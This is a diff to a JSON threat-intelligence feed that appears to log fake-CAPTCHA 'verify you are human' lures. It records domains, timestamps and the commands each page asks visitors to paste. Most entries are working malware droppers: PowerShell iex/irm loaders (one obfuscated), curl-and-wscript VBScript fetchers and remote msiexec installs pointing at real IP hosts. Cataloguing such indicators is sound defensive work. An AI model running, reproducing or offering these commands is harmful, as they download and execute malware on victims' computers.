+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://78.40.209.164:5506/wk.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%wk.vbs\" && \"%temp%wk.vbs\""
+  },
+  {
+    "domain": "orkayacademy.com",
+    "url": "https://orkayacademy.com/",
+    "timestamp": "2026-02-02T07:18:37.581Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify"
+  },
+  {
+    "domain": "peach.prgss.dev",
+    "url": "https://peach.prgss.dev/",
+    "timestamp": "2026-02-02T07:17:48.831Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "nouralhalaby.com",
+    "url": "https://nouralhalaby.com/",
+    "timestamp": "2026-02-02T07:17:00.237Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "odva.wbinnova.com",
+    "url": "https://odva.wbinnova.com/",
+    "timestamp": "2026-02-02T07:16:11.621Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "obchod.moravskysommelier.cz",
+    "url": "https://obchod.moravskysommelier.cz/",
+    "timestamp": "2026-02-02T07:15:21.582Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "newsite.jacquiejordan.com",
+    "url": "https://newsite.jacquiejordan.com/",
+    "timestamp": "2026-02-02T07:13:48.663Z",
+    "commandline": "cmd /c \"curl -s http://178.17.59.40:5506/qk.vbs -o %temp%\\qk.vbs >nul && wscript.exe //B //E:VBScript %temp%\\qk.vbs\""
+  },
+  {
+    "domain": "nhahang3.umemarketingagency.com",
+    "url": "https://nhahang3.umemarketingagency.com/",
+    "timestamp": "2026-02-02T07:13:00.846Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\ny.vbs\" && \"%temp%\\ny.vbs\""
+  },
+  {
+    "domain": "mail.reclaimyourfunds.org",
+    "url": "https://mail.reclaimyourfunds.org/",
+    "timestamp": "2026-02-02T07:12:11.717Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "mail.psicogenealogia.com.br",
+    "url": "https://mail.psicogenealogia.com.br/",
+    "timestamp": "2026-02-02T07:11:23.679Z",
+    "commandline": "cmd.exe /c powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\Downloads\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\""
+  },
+  {
+    "domain": "mail.rodasaopaulo.com.br",
+    "url": "https://mail.rodasaopaulo.com.br/",
+    "timestamp": "2026-02-02T07:10:36.167Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "mail.pvu.gbh.mybluehost.me",
+    "url": "https://mail.pvu.gbh.mybluehost.me/",
+    "timestamp": "2026-02-02T07:09:48.598Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "mail.newday-gt.com",
+    "url": "https://mail.newday-gt.com/",
+    "timestamp": "2026-02-02T07:07:57.930Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "mail.diskopumkm-minahasa.my.id",
+    "url": "https://mail.diskopumkm-minahasa.my.id/",
+    "timestamp": "2026-02-02T07:06:26.113Z",
+    "commandline": "cmd /c \"curl -s http://178.17.59.40:5506/qk.vbs -o %temp%\\qk.vbs >nul && wscript.exe //B //E:VBScript %temp%\\qk.vbs\""
+  },
+  {
+    "domain": "mail.bennnene.com",
+    "url": "https://mail.bennnene.com/",
+    "timestamp": "2026-02-02T07:05:35.982Z",
+    "commandline": "cmd /c echo Set h=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):h.Open \"GET\",\"http://198.13.158.127:5506/ny.vbs\",0:h.Send:Execute h.ResponseText > \"%temp%\\ny.vbs\" && \"%temp%\\ny.vbs\""
+  },
+  {
+    "domain": "lp.rainhadosconsorcios.com.br",
+    "url": "https://lp.rainhadosconsorcios.com.br/",
+    "timestamp": "2026-02-02T07:04:47.283Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "mail.istar-vip.com",
+    "url": "https://mail.istar-vip.com/",
+    "timestamp": "2026-02-02T07:03:59.044Z",
+    "commandline": "cmd /c \"curl -s http://178.17.59.40:5506/qk.vbs -o %temp%\\qk.vbs >nul && wscript.exe //B //E:VBScript %temp%\\qk.vbs\""
+  },
+  {
+    "domain": "mail.imeldaespinoza.com",
+    "url": "https://mail.imeldaespinoza.com/",
+    "timestamp": "2026-02-02T07:03:11.355Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "mail.genesseevalleygolfcourse.com",
+    "url": "https://mail.genesseevalleygolfcourse.com/",
+    "timestamp": "2026-02-02T07:02:24.163Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "mail.destinationecuador.com",
+    "url": "https://mail.destinationecuador.com/",
+    "timestamp": "2026-02-02T07:01:35.674Z",
+    "commandline": "msiexec /i http://inkbookwriters.com/verify /qn"
+  },
+  {
+    "domain": "185.125.91.3",
+    "url": "https://185.125.91.3/",
+    "timestamp": "2026-02-01T01:01:12.876Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "18.217.34.53",
+    "url": "https://18.217.34.53/",
+    "timestamp": "2026-01-31T21:01:10.946Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "16.58.157.121",
+    "url": "https://16.58.157.121/",
+    "timestamp": "2026-01-31T13:01:05.571Z",
+    "commandline": "cmd /c \"curl -s http:/198.13.158.127:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit\""
+  },
+  {
+    "domain": "45.93.20.141",
+    "url": "https://45.93.20.141/",
+    "timestamp": "2026-01-31T05:01:02.915Z",
+    "commandline": "powershell  -wi mi -EP B -c iex(irm 45.93.20.26/n.GRE)"
+  },
+  {
+    "domain": "captolls.com",
+    "url": "https://captolls.com/",
+    "timestamp": "2026-01-29T23:07:16.294Z",
+    "commandline": "powershell -c iex(irm 91.92.240.219 -UseBasicParsing)"
+  },
+  {
+    "domain": "imeta-bypass-check.t3.storage.dev",
+    "url": "https://imeta-bypass-check.t3.storage.dev/Verify-to-Continue-ID-JJ-260125.html",
+    "timestamp": "2026-01-27T17:01:36.684Z",
+    "commandline": "powershell -wi mi -wh (.'powershell' (. 'wget' -usebas 'http://178.17.59.26/w.txt'));I am not a bot - Verification ID: #8626                  )"
+  },
+  {
+    "domain": "securelearn.co",
+    "url": "https://securelearn.co/",
+    "timestamp": "2026-01-27T07:01:19.080Z",
+    "commandline": "conhost.exe --headless cmd /c c:\\windows\\system32\\calc.exe # SecureLearn.co: I am not a robot (I37823610)                   "
+  },
+  {
+    "domain": "18.216.144.67",
+    "url": "https://18.216.144.67/",
+    "timestamp": "2026-01-27T05:01:22.111Z",
+    "commandline": "msiexec /i https://svctc.in/Themes/Cloudflare/Verification/CloudflareChallenge/ID287292"
+  },
+  {
     "domain": "velikieluki.logomebel.ru",
     "url": "https://velikieluki.logomebel.ru/",
     "timestamp": "2026-01-25T11:04:03.477Z",
@@ -11662,12 +12376,6 @@
     "url": "https://nontonfilm.us/",
     "timestamp": "2025-08-22T04:30:28.381Z",
     "commandline": "powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt';\"$om=$kh+$b+$c;$i='{0}{1}{2}' -f 'Net.','Web','Clien';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\""
-  },
-  {
-    "domain": "sidelinesports.com",
-    "url": "https://sidelinesports.com/",
-    "timestamp": "2025-08-22T03:32:02.595Z",
-    "commandline": "powershell -w h -nop -c \"$btp='http://45.144.53.136/g0N.lim';$cdv=\\\"$env:TEMP\\bpkic.ps1\\\";Invoke-RestMethod -Uri $btp -OutFile $cdv;powershell -w h -ep bypass -f $cdv\""
   },
   {
     "domain": "corporateofficehq.com",
